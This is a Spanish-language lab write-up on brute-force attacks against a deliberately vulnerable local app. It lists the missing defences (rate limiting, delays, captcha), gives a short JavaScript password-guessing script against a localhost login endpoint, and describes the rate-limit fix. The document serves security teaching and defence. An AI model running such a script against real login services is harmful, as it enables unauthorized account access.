# EJERCICIO 1.

## ATAQUES DE FUERZA BRUTA

### 1. ¿QUE ERA VULNERABLE?

Los problemas del controlador expuestos por el test 01-brute-force.test.js, son tres:

- No hay límite a la cantidad de intentos de login desde una ip dada.
- No hay demoras entre intentos de login.
- No hay uso de captcha.

Estas debilidades tienen los siguientes inconvenientes, cuando un atacante emplea una forma de automatizar el intento de login mediante el uso de una lista o diccion ario de contraseñas, por ejemplo.

- La posibilidad de intentos ilimitados de login facilita en extremo la posibilidad de éxito de un ataque automatizado, porque el atacante solo debe preocuparse de ejecutar su script.
- La ausencia de demora entre intentos hace rentable cualquier intento automatizado, dada la inmediatez de la respuesta del servidor.
- La ausencia de captcha hace innecesaria la intervención humana, con lo cual también se hace rentable cualquier ataque automatizado.

### 2. ¿COMO LO EXPLOTASTE?

- Iniciando el servidor del backend
- Ejecutando el siguiente script
- Respuesta obtenida: Contraseña encontrada: admin123

```
const url = "http://localhost:5000/api/login";

const passwords = [
"123456",
"password",
"admin",
"admin123",
"wrongpassword",
"vulnerable_app",
"supersecret123",
];

async function tryPasswords() {
for (const password of passwords) {
try {
const response = await fetch(url, {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({
username: "admin",
password,
}),
});

      if (response.status === 200) {
        console.log(`Contraseña encontrada: ${password}`);
        break;
      }
    } catch (error) {
      console.error("Error en la petición:", error.message);
    }

}
}

tryPasswords();
```

### 3. ¿COMO LO CORREGISTE?

- Inicialmente y por varios días, intenté con express-rate-limit, que cumple con bloquear después de x intentos y retorna un HTTP 429, con lo cual el primer test pasa y va al verde.

- En esencia, instalaba la librería, ajustaba los valores e insertaba la función de control en la ruta del logín.

- Pero express-rate-limit detiene los requests antes de la lógica del delay y/o del captcha, con lo cual esos dos test permanecen en rojo.

- El problema era que no se lograba producir el delay necesario para demorar los accesos y activar las defensas contra los dos tests restantes: captcha y delay.

- Posteriormente, decidí intentar usar la lógica de express-rate-limit pero hacerlo sin la librería, de modo tal de poder ir insertando las correcciones entre una lógica que simulase a express-rate-limit.

- Proceso con la nueva aproximación:

1. Rastrear intentos manualmente
2. Aplicar límite basado en IP
3. Insertar lógica personalizada en el orden correcto.

- El orden de inserción es:

1. Contar intentos fallidos
2. Aplicar retraso
3. Requerir captcha
4. Finalmente, devolver el límite de velocidad si los intentos superan el límite

- Funciona perfectamente.

- Comando de ejecución del test 1, fuerza bruta:

```
npx jest test/security/01-brute-force.test.js
```

### 4. ¿QUE APRENDISTE?

- La importancia de que exista esta barrera inicial, por lo sencillo de un ataque de fuerza bruta y lo dañino que puede resultar.
